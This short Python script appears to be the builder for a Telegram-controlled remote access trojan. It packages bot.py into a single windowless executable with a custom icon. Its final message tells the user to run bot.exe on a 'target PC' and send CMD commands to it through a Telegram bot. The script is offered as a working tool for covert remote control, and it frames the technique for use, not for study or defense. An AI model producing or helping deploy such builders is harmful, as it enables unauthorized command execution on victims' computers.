import os
icon = input('Use default file icon or your own icon (D for default, path to file for use your local icon):')
if icon == 'D':
    icon = "bot.py"
else:
  icon = icon
print('Building EXE file...')
os.system(f'pyinstaller --icon {icon} -w --onefile bot.py')
print('Run bot.exe on target PC and send CMD commands to your telegram bot')
